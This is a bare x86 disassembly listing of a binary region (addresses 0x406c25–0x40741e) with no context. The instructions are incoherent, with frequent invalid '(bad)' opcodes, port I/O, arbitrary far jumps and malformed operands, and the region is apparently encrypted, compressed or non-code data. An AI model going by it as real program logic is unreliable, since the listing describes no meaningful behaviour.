  406c25:	sub    edx,ecx
  406c27:	test   al,0x1e
  406c29:	dec    ecx
  406c2a:	inc    ecx
  406c2b:	jmp    0x21d98c96
  406c30:	push   esi
  406c31:	repnz ror BYTE PTR [ebx+0x75],cl
  406c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c36:	(bad)  
  406c37:	out    0xc2,al
  406c39:	jns    0x406c4d
  406c3b:	cdq    
  406c3c:	cmc    
  406c3d:	xor    dl,al
  406c3f:	retf   
  406c40:	shr    BYTE PTR [eax+0x290ab4ca],cl
  406c46:	shl    BYTE PTR [eax],cl
  406c48:	sub    al,0x41
  406c4a:	inc    edi
  406c4b:	jo     0x406cb3
  406c4d:	aad    0xee
  406c4f:	add    eax,0xe07a0258
  406c54:	js     0x406ccf
  406c56:	pop    ebp
  406c57:	jnp    0x406c30
  406c59:	jp     0x406c23
  406c5b:	and    eax,0x66c64c80
  406c60:	or     BYTE PTR [eax+0x67],dh
  406c63:	sbb    dh,cl
  406c65:	jb     0x406c80
  406c67:	rol    eax,1
  406c69:	lds    eax,FWORD PTR [ebp-0x5142afb7]
  406c6f:	sbb    ebp,DWORD PTR [edx]
  406c71:	enter  0x7ce5,0x3
  406c75:	stc    
  406c76:	jo     0x406c6f
  406c78:	inc    eax
  406c79:	rcr    cl,0x20
  406c7c:	xchg   ebp,eax
  406c7d:	jo     0x406c73
  406c7f:	rcr    BYTE PTR [eax-0x519306fc],cl
  406c85:	into   
  406c86:	inc    ecx
  406c87:	dec    esp
  406c88:	cs dec edx
  406c8a:	push   0x12
  406c8c:	ret    
  406c8d:	mov    bl,0xaa
  406c8f:	xor    eax,0x5c9ff9dd
  406c94:	pop    ebp
  406c95:	sub    al,0xd0
  406c97:	in     al,0xf3
  406c99:	gs push esp
  406c9b:	outs   dx,DWORD PTR ds:[esi]
  406c9c:	mov    dl,bl
  406c9e:	mov    dl,0x8c
  406ca0:	cld    
  406ca1:	add    esi,DWORD PTR [ebx+0xdbc3c44]
  406ca7:	test   DWORD PTR [ebx-0x22c32f7b],ebx
  406cad:	jbe    0x406c9c
  406caf:	or     BYTE PTR [edx],dl
  406cb1:	(bad)  
  406cb3:	xor    eax,0x4751c213
  406cb8:	iret   
  406cb9:	inc    ecx
  406cba:	scas   al,BYTE PTR es:[edi]
  406cbb:	mov    bh,0x5d
  406cbd:	inc    ecx
  406cbe:	test   eax,0x36059a05
  406cc3:	mov    BYTE PTR [esi+0x1822b594],dh
  406cc9:	sbb    dh,BYTE PTR [edi+0x5086b938]
  406ccf:	xchg   ecx,eax
  406cd0:	lahf   
  406cd1:	fdiv   DWORD PTR [edi+eax*8]
  406cd4:	mov    al,0x26
  406cd6:	sti    
  406cd7:	es mov bh,0xe3
  406cda:	or     DWORD PTR [ecx],eax
  406cdc:	das    
  406cdd:	adc    bh,BYTE PTR [edi+eax*1-0x2f]
  406ce1:	push   ss
  406ce2:	push   ecx
  406ce3:	mov    al,0xcb
  406ce5:	mov    cs,WORD PTR es:[eax+0x1]
  406ce9:	iret   
  406cea:	sbb    ah,BYTE PTR [bp-0x6d]
  406cee:	stc    
  406cef:	or     eax,0xbe28f1da
  406cf4:	or     al,0xb4
  406cf6:	jge    0x406d4d
  406cf8:	xor    DWORD PTR [edx+ebp*1+0x61023ecd],edx
  406cff:	pop    ecx
  406d00:	push   edx
  406d01:	outs   dx,BYTE PTR ds:[esi]
  406d02:	add    cl,al
  406d04:	mov    edx,DWORD PTR [esi+0x3f885a24]
  406d0a:	or     DWORD PTR [edi+0x58],esi
  406d0d:	mov    dl,0x6b
  406d0f:	outs   dx,BYTE PTR ds:[esi]
  406d10:	das    
  406d11:	push   ecx
  406d12:	(bad)  [eax-0x4d]
  406d15:	adc    al,BYTE PTR [esi+0x2e]
  406d18:	out    dx,al
  406d19:	or     dh,BYTE PTR [edi+0x7525d385]
  406d1f:	push   ecx
  406d20:	scas   al,BYTE PTR es:[edi]
  406d21:	shr    BYTE PTR [ebp-0xae6ee1f],1
  406d27:	(bad)  
  406d28:	out    0x97,eax
  406d2a:	fidiv  WORD PTR ds:[ebp+0x6c5197ec]
  406d31:	push   es
  406d32:	repnz (bad) 
  406d35:	mov    cl,0xcd
  406d37:	cmp    eax,DWORD PTR [edx]
  406d39:	push   ds
  406d3a:	pop    ebx
  406d3b:	outs   dx,DWORD PTR ds:[esi]
  406d3c:	iret   
  406d3d:	and    eax,0xb8a4de55
  406d42:	arpl   ax,bp
  406d44:	inc    esi
  406d45:	scas   al,BYTE PTR es:[edi]
  406d46:	ins    BYTE PTR es:[edi],dx
  406d47:	xchg   esp,eax
  406d48:	sub    BYTE PTR [esi-0x4df51c67],al
  406d4e:	mov    edi,0xae502ea3
  406d53:	cld    
  406d54:	and    BYTE PTR [edx],bl
  406d56:	cmp    al,0x44
  406d58:	jo     0x406d46
  406d5a:	pop    eax
  406d5b:	mov    eax,0xc75d8743
  406d60:	pop    edx
  406d61:	push   es
  406d62:	in     al,0x6f
  406d64:	jo     0x406cf0
  406d66:	pusha  
  406d67:	inc    edx
  406d68:	in     al,0x6d
  406d6a:	test   eax,0xbf9b227f
  406d6f:	adc    eax,0xb7b9ca3
  406d74:	in     al,0x62
  406d76:	outs   dx,DWORD PTR ds:[esi]
  406d77:	jl     0x406df8
  406d79:	sub    eax,0x9eeb9155
  406d7e:	ror    esp,1
  406d80:	imul   ebx,eax,0x54
  406d83:	mov    cs,ebx
  406d85:	push   ss
  406d86:	dec    ecx
  406d87:	popf   
  406d88:	jb     0x406d1e
  406d8a:	inc    edi
  406d8b:	test   DWORD PTR [eax-0x60a94899],esp
  406d91:	dec    DWORD PTR [edx]
  406d93:	lock popw es
  406d96:	retf   
  406d97:	adc    al,0xf2
  406d99:	jnp    0x406d5c
  406d9b:	stc    
  406d9c:	dec    edx
  406d9d:	push   ebp
  406d9e:	lods   eax,DWORD PTR ds:[esi]
  406d9f:	xchg   ebx,eax
  406da0:	ja     0x406e04
  406da2:	idiv   esp
  406da4:	push   ecx
  406da5:	sbb    ecx,DWORD PTR [ebp+0x63]
  406da8:	jmp    0xfe90:0xeeb0452d
  406daf:	je     0x406e22
  406db1:	dec    edx
  406db2:	pop    esi
  406db3:	(bad)
  406db8:	mov    al,ds:0xdecfd77e
  406dbd:	aas    
  406dbe:	mov    eax,ds:0x54bbf3ac
  406dc3:	push   cs
  406dc4:	js     0x406dcb
  406dc6:	jp     0x406d70
  406dc8:	add    BYTE PTR [ebp-0xfe8761a],0x11
  406dcf:	inc    esp
  406dd0:	xor    DWORD PTR [eax-0x7e],0x12
  406dd4:	mov    ?,WORD PTR [bx+si+0x44]
  406dd8:	push   0xa5235dd4
  406ddd:	sub    eax,0xa6cb9d74
  406de2:	cdq    
  406de3:	iret   
  406de4:	adc    al,0x72
  406de6:	sti    
  406de7:	pop    edx
  406de8:	mov    ebp,0x4b5e1b78
  406ded:	out    0x4e,al
  406def:	loopne 0x406e0b
  406df1:	xlat   BYTE PTR ds:[ebx]
  406df2:	add    al,0xfe
  406df4:	jg     0x406e4f
  406df6:	ja     0x406daa
  406df8:	loopne 0x406dec
  406dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dfb:	pop    ecx
  406dfc:	mov    esp,0xb23d6151
  406e01:	pushf  
  406e02:	aad    0xf5
  406e04:	icebp  
  406e05:	sub    eax,DWORD PTR [eax-0x13a35b1]
  406e0b:	clflush BYTE PTR [ebx+0xa]
  406e0f:	sub    DWORD PTR [edx],0x56
  406e12:	sub    bh,BYTE PTR [edx*1+0x7532392]
  406e19:	push   ecx
  406e1a:	lahf   
  406e1b:	jns    0x406e59
  406e1d:	hlt    
  406e1e:	test   eax,0x594e16d
  406e23:	add    edx,DWORD PTR [ecx+0x8]
  406e26:	push   ebx
  406e27:	dec    edx
  406e28:	shr    BYTE PTR [edi],1
  406e2a:	sbb    BYTE PTR [ebx-0x3ff33fb],al
  406e30:	imul   esp,DWORD PTR [eax+0x51],0xffffffc4
  406e34:	adc    BYTE PTR [ebx-0x4693e23a],0x1f
  406e3b:	ja     0x406e34
  406e3d:	pop    ss
  406e3e:	dec    esi
  406e3f:	enter  0x51d4,0x78
  406e43:	aaa    
  406e44:	or     eax,0x8dd234b9
  406e49:	dec    esp
  406e4a:	add    BYTE PTR [edi],dl
  406e4c:	icebp  
  406e4d:	add    eax,0x19b4577e
  406e52:	cdq    
  406e53:	pop    esi
  406e54:	fsubr  st,st(1)
  406e56:	jne    0x406e42
  406e58:	push   eax
  406e59:	dec    esp
  406e5a:	or     al,0x2
  406e5c:	test   eax,0x6f85051e
  406e61:	pusha  
  406e62:	vphaddubw xmm5,XMMWORD PTR [ebp-0x23]
  406e68:	into   
  406e69:	sub    DWORD PTR [edx+ebx*8-0x2ca4e0b],ebp
  406e70:	xchg   BYTE PTR [ebp-0x5d],cl
  406e73:	add    ch,BYTE PTR [esi+0x5a]
  406e76:	cli    
  406e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e78:	test   eax,0x4f7ae8e2
  406e7d:	sub    al,0x43
  406e7f:	jmp    0x79ab:0xd46eef7f
  406e86:	mov    edi,0x486ef93b
  406e8b:	mov    ebp,0x3f88239f
  406e90:	and    dl,BYTE PTR [ecx+0x28]
  406e93:	push   0x14e476ac
  406e98:	push   ss
  406e99:	inc    ebx
  406e9a:	or     bh,BYTE PTR [esi]
  406e9c:	jle    0x406e34
  406e9e:	pop    esi
  406e9f:	call   0xb9d392cf
  406ea4:	ins    DWORD PTR es:[edi],dx
  406ea5:	jecxz  0x406e57
  406ea7:	mov    al,0x4f
  406ea9:	lock jb 0x406e54
  406eac:	cli    
  406ead:	cmp    al,0x25
  406eaf:	xor    edx,DWORD PTR [eax-0x20]
  406eb2:	dec    edx
  406eb3:	pop    esi
  406eb4:	inc    edi
  406eb5:	or     eax,0x94369a3b
  406eba:	rcr    DWORD PTR [ebx+eiz*1+0x26],0xc7
  406ebf:	mov    ds:0x43915914,al
  406ec4:	inc    ecx
  406ec5:	repnz push esi
  406ec7:	xchg   edx,eax
  406ec8:	xchg   edx,eax
  406ec9:	inc    ecx
  406eca:	dec    edi
  406ecb:	(bad)  
  406ecc:	and    ecx,DWORD PTR [ebx+0x34d2e38c]
  406ed2:	push   esi
  406ed3:	pop    ss
  406ed4:	repz fcomp QWORD PTR [ecx+0x76167a45]
  406edb:	lods   al,BYTE PTR ds:[esi]
  406edc:	jno    0x406edf
  406ede:	fstp   QWORD PTR [esi-0x5a]
  406ee1:	cmp    ebx,DWORD PTR [edi+0x2c709a42]
  406ee7:	imul   BYTE PTR [ebp+0x4084e2]
  406eed:	push   edx
  406eee:	xchg   esi,eax
  406eef:	mov    esp,ebx
  406ef1:	pop    edi
  406ef2:	xchg   esi,eax
  406ef3:	mov    ebx,DWORD PTR [esi-0x24]
  406ef6:	add    BYTE PTR [ebx-0x13c6860f],0xa7
  406efd:	jge    0x406ef2
  406eff:	cs (bad) 
  406f01:	mov    ecx,0x7af772f4
  406f06:	adc    eax,0x387a2550
  406f0b:	pushf  
  406f0c:	test   eax,0xb46e8515
  406f11:	inc    eax
  406f12:	mov    esp,0x10e901e8
  406f17:	iret   
  406f18:	lods   al,BYTE PTR ds:[esi]
  406f19:	call   DWORD PTR [eax-0x314d496f]
  406f1f:	mov    al,ds:0x326e9686
  406f24:	or     esp,DWORD PTR [ebx-0x2]
  406f27:	mov    BYTE PTR [eax-0xfa34a5f],bh
  406f2d:	not    BYTE PTR [ebp+0x5efc1439]
  406f33:	imul   BYTE PTR [esp+ecx*8+0x647eaaa4]
  406f3a:	stos   BYTE PTR es:[edi],al
  406f3b:	(bad)  
  406f3c:	jl     0x406f45
  406f3e:	add    al,BYTE PTR [esi]
  406f40:	mov    dl,0x31
  406f42:	pop    esp
  406f43:	ret    0x2bb9
  406f46:	jg     0x406edc
  406f48:	hlt    
  406f49:	(bad)  
  406f4a:	test   edx,0x2c3698ec
  406f50:	dec    edi
  406f51:	ja     0x406f13
  406f53:	and    ebp,ebp
  406f55:	out    0x1c,eax
  406f57:	daa    
  406f58:	ss mov ebx,0xbb9a591b
  406f5e:	jecxz  0x406fcf
  406f60:	ja     0x406f59
  406f62:	mov    esp,0xda2dae95
  406f67:	daa    
  406f68:	jle    0x406fc5
  406f6a:	and    bl,BYTE PTR [si-0x4d]
  406f6e:	push   ss
  406f6f:	ds std 
  406f71:	xchg   cl,ch
  406f73:	jecxz  0x406f4d
  406f75:	rol    DWORD PTR [ebx-0x73abd745],1
  406f7b:	test   eax,0xabe77018
  406f80:	sbb    al,0xef
  406f82:	test   al,0x5
  406f84:	inc    esp
  406f85:	push   cs
  406f86:	leave  
  406f87:	or     dh,BYTE PTR [ecx+0x18]
  406f8a:	mov    ah,0x17
  406f8c:	fwait
  406f8d:	xor    ecx,eax
  406f8f:	and    edx,edx
  406f91:	pop    eax
  406f92:	jmp    DWORD PTR [ecx-0x40]
  406f95:	pop    ebx
  406f96:	je     0x406f7f
  406f98:	inc    esi
  406f99:	mov    ch,0x15
  406f9b:	mov    ch,dl
  406f9d:	sbb    esp,DWORD PTR [esi]
  406f9f:	in     al,0x18
  406fa1:	add    DWORD PTR [edx],edi
  406fa3:	clc    
  406fa4:	out    0xac,al
  406fa6:	xlat   BYTE PTR ds:[ebx]
  406fa7:	cmp    BYTE PTR [edi+0x31],bl
  406faa:	ins    DWORD PTR es:[edi],dx
  406fab:	iret   
  406fac:	xchg   esi,eax
  406fad:	bswap  esp
  406faf:	cld    
  406fb0:	repz pop ebp
  406fb2:	sbb    al,0x5c
  406fb4:	xor    BYTE PTR [ecx-0x6f87728d],al
  406fba:	xor    BYTE PTR [esi+edx*4-0x41],ch
  406fbe:	das    
  406fbf:	push   0x67f9444b
  406fc4:	iret   
  406fc5:	mov    dh,0xc8
  406fc7:	inc    ecx
  406fc8:	jecxz  0x407047
  406fca:	hlt    
  406fcb:	mov    ecx,ss
  406fcd:	imul   edx,DWORD PTR [esi+0x1f4a1d88],0x9ac7bb1a
  406fd7:	mov    edx,0xf80042e6
  406fdc:	inc    esp
  406fdd:	std    
  406fde:	pop    ecx
  406fdf:	mov    edi,0x65340fa2
  406fe4:	ss retf 
  406fe6:	dec    edi
  406fe7:	das    
  406fe8:	push   cx
  406fea:	fsubp  st(7),st
  406fec:	aad    0xb0
  406fee:	xlat   BYTE PTR ds:[ebx]
  406fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ff0:	add    BYTE PTR [esi],dh
  406ff2:	xchg   edx,eax
  406ff3:	jmp    0x25c6aa4b
  406ff8:	(bad)  
  406ff9:	nop
  406ffa:	mov    ecx,0x21bec5ae
  406fff:	xchg   esp,eax
  407000:	mov    al,0x84
  407002:	dec    ebx
  407003:	sti    
  407004:	mov    ah,0x56
  407006:	dec    ebp
  407007:	or     al,0xc7
  407009:	cmp    eax,0xa8062bd8
  40700e:	jl     0x406fe1
  407010:	inc    DWORD PTR [edx-0x1c829666]
  407016:	(bad)  
  407017:	sbb    BYTE PTR [esi-0x10],ah
  40701a:	and    dl,BYTE PTR [ebp+ecx*1+0x76]
  40701e:	out    0x3d,eax
  407020:	mov    dl,0x89
  407022:	(bad)  
  407023:	leave  
  407024:	pop    eax
  407025:	xor    DWORD PTR [eax+0x6353278b],0xb859ed08
  40702f:	jo     0x407064
  407031:	jo     0x406fba
  407033:	shl    DWORD PTR [ebx-0x2a],cl
  407036:	mov    al,ds:0x6d449aa8
  40703b:	inc    esi
  40703c:	cld    
  40703d:	pop    edx
  40703e:	sub    al,cl
  407040:	in     eax,0x5c
  407042:	sub    esi,DWORD PTR [ebx]
  407044:	cmp    esi,DWORD PTR [ebp+0x68]
  407047:	out    dx,al
  407048:	shl    BYTE PTR [ecx+esi*4],0x9
  40704c:	inc    esp
  40704d:	or     ebp,DWORD PTR [ebp-0x3938ffc7]
  407053:	cs sahf 
  407055:	(bad)  
  407056:	(bad)  
  407057:	mov    esp,0xeb70a7e2
  40705c:	js     0x407027
  40705e:	jmp    0xc9a1:0xa70438bc
  407065:	inc    ebp
  407066:	cmp    al,0xdf
  407068:	push   ebx
  407069:	adc    eax,0xf9f7b908
  40706e:	(bad)  
  40706f:	mov    esi,0xf3b1f04b
  407074:	stos   DWORD PTR es:[edi],eax
  407075:	push   es
  407076:	lock fstp QWORD PTR [ebp+0xefe071d]
  40707d:	mov    ebx,0x9ea6da45
  407082:	mov    ds:0xc711b0b9,al
  407087:	stos   BYTE PTR es:[edi],al
  407088:	mov    eax,0x1b0183c4
  40708d:	dec    ecx
  40708e:	sub    bh,dh
  407090:	pop    edx
  407091:	fcomp  st(4)
  407093:	jbe    0x407104
  407095:	jmp    0x3cb3:0xad710946
  40709c:	inc    ebx
  40709d:	outs   dx,BYTE PTR ds:[esi]
  40709e:	sahf   
  40709f:	mov    cl,0xee
  4070a1:	xor    ebx,DWORD PTR [ebx-0x4c]
  4070a4:	mov    ebx,DWORD PTR [eax]
  4070a6:	scas   al,BYTE PTR es:[edi]
  4070a7:	mov    ecx,0x34d34ebc
  4070ac:	jb     0x4070f8
  4070ae:	jge    0x407060
  4070b0:	cmp    ch,dl
  4070b2:	sahf   
  4070b3:	mov    edx,0x11c0a13e
  4070b8:	dec    ebp
  4070b9:	sub    BYTE PTR [edi-0x65e606b1],0xe4
  4070c0:	clc    
  4070c1:	shl    DWORD PTR [ecx-0x13],1
  4070c4:	or     al,0x81
  4070c6:	shl    DWORD PTR [ebp-0x4a],cl
  4070c9:	popf   
  4070ca:	xchg   ebx,eax
  4070cb:	mov    al,ds:0x45358b4d
  4070d0:	lock adc dh,BYTE PTR [esp+ebx*1]
  4070d4:	aaa    
  4070d5:	push   0x1a
  4070d7:	into   
  4070d8:	xchg   esp,eax
  4070d9:	dec    DWORD PTR [ebx]
  4070db:	mov    ebx,0x4ba0997a
  4070e0:	sub    DWORD PTR [ebx],ecx
  4070e2:	push   eax
  4070e3:	in     al,0xe7
  4070e5:	jecxz  0x407105
  4070e7:	scas   ax,WORD PTR es:[edi]
  4070e9:	sub    esp,DWORD PTR [esi-0x6f]
  4070ec:	(bad)  
  4070ed:	or     eax,0x1d0ed0ef
  4070f2:	push   edx
  4070f3:	out    dx,al
  4070f4:	xor    al,0x3d
  4070f6:	adc    edi,esi
  4070f8:	and    al,0xcc
  4070fa:	cmp    ch,BYTE PTR [edi]
  4070fc:	adc    al,0xc7
  4070fe:	mov    ?,WORD PTR [ebx+0x33]
  407101:	xor    al,0x70
  407103:	sbb    al,0x6a
  407105:	cli    
  407106:	fdivr  QWORD PTR [edi-0x32]
  407109:	enter  0x8054,0xda
  40710d:	jmp    0x58979e0b
  407112:	cli    
  407113:	cld    
  407114:	scas   al,BYTE PTR es:[edi]
  407115:	mov    ds:0x676c0071,al
  40711a:	add    al,0x47
  40711c:	add    dh,ch
  40711e:	jo     0x4070e2
  407120:	cmp    DWORD PTR [ecx],edx
  407122:	ret    
  407123:	sub    ecx,DWORD PTR [ebx+0x799f61fd]
  407129:	jae    0x407187
  40712b:	jne    0x407129
  40712d:	icebp  
  40712e:	sbb    ebx,edi
  407130:	adc    al,BYTE PTR [ecx-0x6697a457]
  407136:	xor    bl,BYTE PTR [esi]
  407138:	sub    ebp,DWORD PTR [bp+si+0x3d9a]
  40713d:	push   0x746f70c3
  407142:	pop    ebp
  407143:	or     eax,0x690134ff
  407148:	pop    ss
  407149:	jmp    0x53ff26d7
  40714e:	sbb    ebx,DWORD PTR [esi]
  407150:	push   esp
  407151:	scas   al,BYTE PTR es:[edi]
  407152:	jns    0x4070ee
  407154:	mov    WORD PTR [ebp-0x31],ss
  407157:	xor    DWORD PTR [esi-0x37],0xf172340a
  40715e:	cwde   
  40715f:	jge    0x407143
  407161:	lds    ebp,FWORD PTR [ebx-0x2b]
  407164:	clc    
  407165:	enterw 0xe550,0x4
  40716a:	mov    cs,WORD PTR ds:0x8b992bc6
  407170:	movups xmm5,xmm2
  407173:	pop    edi
  407174:	out    dx,al
  407175:	sbb    al,0x51
  407177:	pop    es
  407178:	push   0xb3e300b5
  40717d:	lods   al,BYTE PTR ds:[esi]
  40717e:	leave  
  40717f:	mov    ch,0xb5
  407181:	mov    ecx,0x19331da7
  407186:	push   DWORD PTR [ebx+ebx*1-0x75]
  40718a:	jo     0x4071c7
  40718c:	mov    bl,bl
  40718e:	out    dx,eax
  40718f:	xor    BYTE PTR [eax-0x22],bh
  407192:	jbe    0x407170
  407194:	stos   DWORD PTR es:[edi],eax
  407195:	jg     0x4071f0
  407197:	add    BYTE PTR [eax+0x3b],ah
  40719a:	fdivr  QWORD PTR [esi+0x73ba5098]
  4071a0:	mov    edx,0x9b5db487
  4071a5:	push   esi
  4071a6:	jne    0x40713e
  4071a8:	inc    esp
  4071a9:	sub    al,0xd7
  4071ab:	fiadd  DWORD PTR [ebx*8+0x7b2cee85]
  4071b2:	cmp    eax,0x445faf4f
  4071b7:	mov    al,0x20
  4071b9:	push   0xffffffc4
  4071bb:	jmp    0x5885c524
  4071c0:	add    ch,al
  4071c2:	lods   al,BYTE PTR ds:[esi]
  4071c3:	push   edx
  4071c4:	cld    
  4071c5:	add    eax,0x3d4069d0
  4071ca:	adc    DWORD PTR [edi-0x23],ecx
  4071cd:	cmp    BYTE PTR [edx+0x79],0x53
  4071d1:	test   eax,0xe6874733
  4071d6:	lock cmp eax,esi
  4071d9:	fidiv  DWORD PTR [ebx+0x8]
  4071dc:	idiv   dl
  4071de:	mov    dh,0x3d
  4071e0:	lock mov dh,0xe1
  4071e3:	xchg   edi,eax
  4071e4:	nop
  4071e5:	add    bh,BYTE PTR [edx+0x3a757a23]
  4071eb:	ins    BYTE PTR es:[edi],dx
  4071ec:	xchg   ebp,eax
  4071ed:	fisubr DWORD PTR [ebp+0x23b38051]
  4071f3:	or     DWORD PTR [ecx+0x12],ebx
  4071f6:	leave  
  4071f7:	push   ecx
  4071f8:	cli    
  4071f9:	cs cmp eax,0x65da2d34
  4071ff:	dec    ecx
  407200:	fidiv  WORD PTR [eax-0x5d]
  407203:	adc    eax,0xdc78cbba
  407208:	arpl   si,cx
  40720a:	dec    edx
  40720b:	aaa    
  40720c:	xor    DWORD PTR [eax+0x1f],edi
  40720f:	and    al,0x2a
  407211:	pop    ecx
  407212:	pop    ss
  407213:	inc    ebx
  407214:	lea    ebx,[ebp+edi*2+0x38]
  407218:	add    DWORD PTR [esi+0x1628ac8c],ebp
  40721e:	and    bh,ah
  407220:	and    eax,0xede53bb
  407225:	mov    esp,es
  407227:	repz add ch,ch
  40722a:	sub    dh,ch
  40722c:	xor    ebp,edi
  40722e:	mov    ch,0x57
  407230:	stc    
  407231:	rcr    DWORD PTR [edx+0x2a],cl
  407234:	push   ecx
  407235:	out    dx,al
  407236:	lods   eax,DWORD PTR ds:[esi]
  407237:	arpl   WORD PTR [edi+edi*8-0xe],ax
  40723b:	push   ss
  40723c:	call   0xbec9ab7b
  407241:	xor    al,0x91
  407243:	jmp    0x4072b1
  407245:	dec    eax
  407246:	push   esi
  407247:	xchg   edx,eax
  407248:	push   esp
  407249:	dec    edi
  40724a:	cmp    al,0x1c
  40724c:	push   eax
  40724d:	mov    dl,0x85
  40724f:	inc    edx
  407250:	jbe    0x40725d
  407252:	or     eax,0x4cba1afe
  407257:	and    al,dh
  407259:	pop    ss
  40725a:	popf   
  40725b:	scas   eax,DWORD PTR es:[edi]
  40725c:	xor    ch,0xf3
  40725f:	add    eax,DWORD PTR ds:0xb63f136b
  407265:	xchg   BYTE PTR [edx+0x46ce2b1a],dl
  40726b:	mov    BYTE PTR [edx],0x75
  40726e:	cmp    esi,esp
  407270:	push   ebx
  407271:	nop
  407272:	dec    ebx
  407273:	pop    edi
  407274:	inc    eax
  407275:	jbe    0x40728b
  407277:	add    edi,esi
  407279:	pop    ss
  40727a:	jmp    0xdedbb4e7
  40727f:	add    al,0x83
  407281:	push   edx
  407282:	push   cs
  407283:	jg     0x4072ba
  407285:	and    eax,esp
  407287:	repnz sub cl,BYTE PTR [ebp-0x15]
  40728b:	xor    edx,edx
  40728d:	int    0x87
  40728f:	xor    ebp,DWORD PTR [ebx+0x62540d5]
  407295:	pop    ss
  407296:	ja     0x407256
  407298:	repz jecxz 0x407260
  40729b:	(bad)  
  40729c:	call   0xf85f:0xed6ba7d7
  4072a3:	xchg   DWORD PTR [ecx],edx
  4072a5:	loope  0x40731a
  4072a7:	call   ebx
  4072a9:	mov    eax,0x3f260371
  4072ae:	add    al,0x87
  4072b0:	ret    
  4072b1:	fwait
  4072b2:	adc    BYTE PTR [edi+0x2f44b0a2],al
  4072b8:	js     0x4072eb
  4072ba:	jae    0x40728f
  4072bc:	and    eax,edi
  4072be:	ja     0x407301
  4072c0:	leave  
  4072c1:	iret   
  4072c2:	sub    eax,0x1735b2fb
  4072c7:	mov    ecx,0x14861827
  4072cc:	and    BYTE PTR [ebx*8+0x3fe57833],al
  4072d3:	mov    cl,0x68
  4072d5:	cmp    al,0x10
  4072d7:	xchg   ah,dh
  4072d9:	or     bh,al
  4072db:	pop    esi
  4072dc:	gs pop es
  4072de:	mov    esi,ebp
  4072e0:	mov    eax,0x96b799f8
  4072e5:	pop    ebp
  4072e6:	pop    ds
  4072e7:	loop   0x4072f6
  4072e9:	push   DWORD PTR [edi+0x66]
  4072ec:	jg     0x4072a9
  4072ee:	mov    bh,dh
  4072f0:	bnd jmp 0x4072af
  4072f3:	(bad)  
  4072f4:	jae    0x407349
  4072f6:	dec    ecx
  4072f7:	jge    0x40730e
  4072f9:	outs   dx,DWORD PTR ds:[esi]
  4072fa:	int    0x84
  4072fc:	lods   al,BYTE PTR ds:[esi]
  4072fd:	out    0xfd,eax
  4072ff:	cli    
  407300:	(bad)  [ebx]
  407302:	sub    al,0x4b
  407304:	outs   dx,DWORD PTR ds:[esi]
  407305:	cs js  0x40735f
  407308:	mov    al,ds:0xfa006751
  40730d:	inc    edx
  40730e:	div    BYTE PTR [eax-0x6f]
  407311:	jns    0x4072ef
  407313:	fist   WORD PTR [ecx-0x7ce6cec1]
  407319:	retf   0x374f
  40731c:	cmc    
  40731d:	inc    edi
  40731e:	test   DWORD PTR [ebp+0x3b],edi
  407321:	sbb    eax,0xd17b53f4
  407326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407327:	cmc    
  407328:	xor    BYTE PTR [esi+ecx*1+0x2e],ah
  40732c:	arpl   WORD PTR [edx+0x67399490],bp
  407332:	or     bl,cl
  407334:	jnp    0x407360
  407336:	dec    edi
  407337:	mov    al,ds:0x1f298c4e
  40733c:	push   eax
  40733d:	xchg   esp,eax
  40733e:	xchg   BYTE PTR [eax],bl
  407340:	dec    edi
  407341:	stc    
  407342:	or     BYTE PTR [eax+0x4973230a],bl
  407348:	rol    BYTE PTR [eax],cl
  40734a:	je     0x407321
  40734c:	jns    0x40731d
  40734e:	push   ds
  40734f:	lock stos DWORD PTR es:[edi],eax
  407351:	adc    ecx,DWORD PTR [edi-0x5c1fec77]
  407357:	mov    ds:0x43d07264,eax
  40735c:	pop    ecx
  40735d:	dec    esi
  40735e:	lock add BYTE PTR [ebp+0x8bb33f],dh
  407365:	(bad)  
  407366:	call   0x81be:0x5090cb8e
  40736d:	lahf   
  40736e:	fnstcw WORD PTR [eax-0x74be34e0]
  407374:	aaa    
  407375:	mov    edx,0xe137299c
  40737a:	jmp    0x1e17:0xb3948710
  407381:	fsubp  st(2),st
  407383:	mov    cl,0xca
  407385:	inc    esi
  407386:	push   ebx
  407387:	lock xchg ecx,esp
  40738a:	shr    DWORD PTR [ebp-0x203d2dd4],cl
  407390:	gs jno 0x4073aa
  407393:	cs in  al,dx
  407395:	das    
  407396:	xchg   esp,eax
  407397:	fwait
  407398:	push   ebp
  407399:	xchg   ebx,eax
  40739a:	xor    cl,ch
  40739c:	inc    esp
  40739d:	js     0x4073e8
  40739f:	popf   
  4073a0:	cmp    eax,0xd09de455
  4073a5:	rol    DWORD PTR [eax-0x66d0dbe4],0xa5
  4073ac:	fmulp  st(6),st
  4073ae:	shl    BYTE PTR [esi-0x3b3c4fc3],cl
  4073b4:	and    al,0x1c
  4073b6:	dec    ebx
  4073b7:	dec    esi
  4073b8:	mov    ds:0x475b9d95,al
  4073bd:	mov    ebx,0x8dc97aed
  4073c2:	mov    ah,BYTE PTR [edi-0x44]
  4073c5:	in     al,0x5c
  4073c7:	shl    BYTE PTR [edx],0x1c
  4073ca:	inc    esp
  4073cb:	retf   0xb54e
  4073ce:	xor    eax,0xb9c22890
  4073d3:	pop    ecx
  4073d4:	or     bh,BYTE PTR [edx+0x9a2740a]
  4073da:	mov    esi,0x2dee57f4
  4073df:	cld    
  4073e0:	repnz lods al,BYTE PTR ds:[esi]
  4073e2:	jp     0x4073ba
  4073e4:	and    bl,BYTE PTR [edx]
  4073e6:	repz push esi
  4073e8:	push   ecx
  4073e9:	into   
  4073ea:	lea    eax,[eax-0x112c8504]
  4073f0:	out    dx,al
  4073f1:	jbe    0x407414
  4073f3:	cmp    dl,BYTE PTR [eax]
  4073f5:	jg     0x407452
  4073f7:	ss mov ebp,ebp
  4073fa:	xchg   edi,eax
  4073fb:	mov    eax,ds:0xc0fb65d6
  407400:	mov    ds:0xa3a786a6,al
  407405:	les    ebp,FWORD PTR [edx+ebx*2]
  407408:	cld    
  407409:	sbb    al,0x8e
  40740b:	pop    eax
  40740c:	push   ebx
  40740d:	and    cl,BYTE PTR [ecx]
  40740f:	ins    DWORD PTR es:[edi],dx
  407410:	ds (bad) 
  407412:	loope  0x4073a8
  407414:	inc    ecx
  407416:	mov    ecx,0xde006e2e
  40741b:	scas   eax,DWORD PTR es:[edi]
  40741c:	dec    edx
  40741d:	ret    
  40741e:	add    eax,0xc8608ad3
